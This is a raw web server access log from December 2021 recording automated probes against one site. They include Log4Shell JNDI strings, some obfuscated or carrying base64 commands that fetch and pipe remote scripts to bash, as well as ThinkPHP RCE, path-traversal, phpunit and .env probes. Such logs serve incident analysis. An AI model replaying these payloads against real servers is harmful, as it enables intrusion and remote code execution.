195.54.160.149 - - [20/Dec/2021:22:17:57 +0800] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.185.124.100 - - [20/Dec/2021:22:40:48 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
195.54.160.149 - - [20/Dec/2021:23:05:29 +0800] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
122.4.222.110 - - [20/Dec/2021:23:08:25 +0800] "GET /phpmyadmin/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0"
122.4.222.110 - - [20/Dec/2021:23:08:28 +0800] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 404 260 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.11079.201"
122.4.222.110 - - [20/Dec/2021:23:08:32 +0800] "GET /pmd/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12"
122.4.222.110 - - [20/Dec/2021:23:08:35 +0800] "GET /index.php HTTP/1.1" 200 4923 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)"
195.54.160.149 - - [20/Dec/2021:23:15:51 +0800] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
183.136.225.9 - - [20/Dec/2021:23:37:35 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
195.54.160.149 - - [21/Dec/2021:00:23:55 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:00:26:07 +0800] "GET /console/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.180.143.138 - - [21/Dec/2021:00:27:13 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:01:34:52 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:01:52:24 +0800] "GET /index.php HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:01:52:55 +0800] "GET /index.php HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:01:53:25 +0800] "GET /index.php HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:01:57:28 +0800] "GET /_ignition/execute-solution HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
86.57.246.76 - - [21/Dec/2021:02:05:11 +0800] "GET /${jndi:ldap://185.246.87.50:1389/Exploit} HTTP/1.1" 404 260 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
86.57.246.76 - - [21/Dec/2021:02:05:11 +0800] "GET / HTTP/1.1" 200 14759 "-" "${jndi:ldap://185.246.87.50:1389/Exploit}"
86.57.246.76 - - [21/Dec/2021:02:05:11 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
147.182.237.209 - - [21/Dec/2021:03:02:30 +0800] "GET /${jndi:ldap://185.246.87.50:1389/Exploit} HTTP/1.1" 404 260 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
147.182.237.209 - - [21/Dec/2021:03:02:30 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
147.182.237.209 - - [21/Dec/2021:03:02:30 +0800] "GET / HTTP/1.1" 200 14759 "-" "${jndi:ldap://185.246.87.50:1389/Exploit}"
195.54.160.149 - - [21/Dec/2021:03:08:51 +0800] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:03:46:36 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.213.252 - - [21/Dec/2021:03:51:50 +0800] "GET /actuator/health HTTP/1.1" 404 260 "-" "Mozilla/5.0 zgrab/0.x"
195.54.160.149 - - [21/Dec/2021:04:08:30 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}"
23.183.83.160 - - [21/Dec/2021:04:40:43 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
23.183.83.160 - - [21/Dec/2021:04:42:24 +0800] "POST /HNAP1/ HTTP/1.1" 404 260 "-" "Mozila/5.0"
118.126.124.74 - - [21/Dec/2021:05:09:44 +0800] "GET /platform/passport/captcha.html HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
51.254.59.113 - - [21/Dec/2021:05:38:56 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
206.84.70.57 - - [21/Dec/2021:06:26:48 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
206.84.70.57 - - [21/Dec/2021:06:26:48 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
206.84.70.57 - - [21/Dec/2021:06:26:48 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
37.0.10.73 - - [21/Dec/2021:06:32:54 +0800] "GET /.env HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
37.0.10.73 - - [21/Dec/2021:06:32:56 +0800] "POST / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.142.125.193 - - [21/Dec/2021:06:42:24 +0800] "GET / HTTP/1.1" 200 8142 "-" "-"
45.137.23.246 - - [21/Dec/2021:07:13:25 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
185.108.164.180 - - [21/Dec/2021:08:48:48 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
111.28.189.51 - - [21/Dec/2021:09:03:13 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
111.28.189.51 - - [21/Dec/2021:09:03:13 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
111.28.189.51 - - [21/Dec/2021:09:03:14 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
111.28.189.51 - - [21/Dec/2021:09:03:14 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
64.62.197.182 - - [21/Dec/2021:09:06:08 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
128.1.248.42 - - [21/Dec/2021:09:06:09 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
114.55.25.1 - - [21/Dec/2021:09:12:38 +0800] "HEAD /Runtime/Logs/Home/21_12_21.log HTTP/1.1" 404 - "-" "python-requests/2.25.1"
118.126.124.7 - - [21/Dec/2021:09:41:35 +0800] "GET /TP/public/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:09:54:03 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:09:54:34 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:09:55:04 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.198 - - [21/Dec/2021:10:30:03 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.198 - - [21/Dec/2021:10:30:33 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.198 - - [21/Dec/2021:10:31:04 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
193.118.53.194 - - [21/Dec/2021:10:38:44 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
93.115.29.144 - - [21/Dec/2021:10:51:27 +0800] "GET / HTTP/1.1" 200 14759 "-" "Java/1.8.0_312"
13.78.42.149 - - [21/Dec/2021:11:29:41 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
191.232.38.25 - - [21/Dec/2021:11:36:28 +0800] "GET /${jndi:ldap://185.246.87.50:1389/Exploit} HTTP/1.1" 404 260 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
191.232.38.25 - - [21/Dec/2021:11:36:29 +0800] "GET / HTTP/1.1" 200 14759 "-" "${jndi:ldap://185.246.87.50:1389/Exploit}"
191.232.38.25 - - [21/Dec/2021:11:36:29 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.58.0"
118.126.124.141 - - [21/Dec/2021:11:44:36 +0800] "GET /$%7Bjndi:ldap://185.246.87.50:1389/Exploit%7D HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
151.235.210.178 - - [21/Dec/2021:12:01:35 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
118.126.124.7 - - [21/Dec/2021:13:17:02 +0800] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 290 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.7 - - [21/Dec/2021:14:07:59 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.7 - - [21/Dec/2021:14:08:29 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.7 - - [21/Dec/2021:14:08:59 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
23.183.83.160 - - [21/Dec/2021:14:34:47 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
23.183.83.160 - - [21/Dec/2021:14:36:28 +0800] "POST /HNAP1/ HTTP/1.1" 404 260 "-" "Mozila/5.0"
118.126.124.7 - - [21/Dec/2021:15:07:32 +0800] "GET /.env HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:16:15:28 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:16:15:59 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [21/Dec/2021:16:16:30 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
114.55.25.1 - - [21/Dec/2021:16:49:53 +0800] "HEAD /Application/Runtime/Logs/Home/21_12_21.log HTTP/1.1" 404 - "-" "python-requests/2.25.1"
43.132.102.100 - - [21/Dec/2021:17:04:57 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:17:11:00 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.109.131.194 - - [21/Dec/2021:17:09:53 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:18:04:01 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.126.124.172 - - [21/Dec/2021:18:09:32 +0800] "GET /TP/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:19:13:09 +0800] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.133.58 - - [21/Dec/2021:19:30:28 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
88.0.214.160 - - [21/Dec/2021:19:55:52 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
195.54.160.149 - - [21/Dec/2021:20:00:16 +0800] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:20:41:52 +0800] "GET /console/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.214.102 - - [21/Dec/2021:20:44:55 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
195.54.160.149 - - [21/Dec/2021:21:22:38 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.126.124.172 - - [21/Dec/2021:21:25:02 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:21:52:28 +0800] "GET /_ignition/execute-solution HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:22:49:30 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [21/Dec/2021:23:06:31 +0800] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2.56.59.221 - - [21/Dec/2021:23:16:06 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
118.126.124.7 - - [21/Dec/2021:23:44:49 +0800] "GET /HNAP1/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
114.55.25.1 - - [22/Dec/2021:01:01:05 +0800] "HEAD /data/runtime/Logs/User/21_12_21.log HTTP/1.1" 404 - "-" "python-requests/2.25.1"
172.104.140.107 - - [22/Dec/2021:01:16:53 +0800] "GET /nmaplowercheck1640107012 HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:53 +0800] "POST /scripts/WPnBr.dll HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:53 +0800] "GET /HNAP1 HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:53 +0800] "GET /CSS/Miniweb.css HTTP/1.1" 404 260 "-" "curl/7.54.0"
172-104-140-107.ip.linodeusercontent.com - - [22/Dec/2021:01:16:54 +0800] "GET /server-status HTTP/1.1" 403 263 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:55 +0800] "GET /pools/default/buckets HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:55 +0800] "GET /.git/HEAD HTTP/1.1" 403 263 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:55 +0800] "GET /menu.jsa HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:55 +0800] "GET /pools HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:56 +0800] "GET /Portal/Portal.mwsl HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:56 +0800] "GET /Bk7x HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:56 +0800] "POST /sdk HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:56 +0800] "GET /Portal0000.htm HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:56 +0800] "GET /start.cfm HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:56 +0800] "GET /docs/cplugError.html/ HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:56 +0800] "GET /__Additional HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:57 +0800] "GET /index.asp HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:57 +0800] "GET /main.jsp HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:58 +0800] "GET /home.html HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:58 +0800] "GET /menu.cgi HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:59 +0800] "GET /inicio.cgi HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:00 +0800] "GET /robots.txt HTTP/1.1" 200 505 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:00 +0800] "GET /readme.txt HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:01 +0800] "GET /menu.asp HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:02 +0800] "GET /start.cgi HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:02 +0800] "GET /menu.cfm HTTP/1.1" 404 260 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:53 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:54 +0800] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 14759 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:16:54 +0800] "HEAD / HTTP/1.1" 200 - "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:02 +0800] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 200 14759 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:02 +0800] "GET / HTTP/1.1" 200 14759 "-" "curl/7.54.0"
172.104.140.107 - - [22/Dec/2021:01:17:04 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
95.78.192.84 - - [22/Dec/2021:01:18:40 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
39.99.231.76 - - [22/Dec/2021:01:19:37 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
39.99.231.76 - - [22/Dec/2021:01:20:12 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
39.99.231.76 - - [22/Dec/2021:01:20:20 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
39.99.231.76 - - [22/Dec/2021:01:20:26 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
39.99.231.76 - - [22/Dec/2021:01:20:39 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
39.99.231.76 - - [22/Dec/2021:01:20:56 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
39.99.231.76 - - [22/Dec/2021:01:21:18 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
118.126.124.74 - - [22/Dec/2021:03:07:21 +0800] "GET /scripts/WPnBr.dll HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
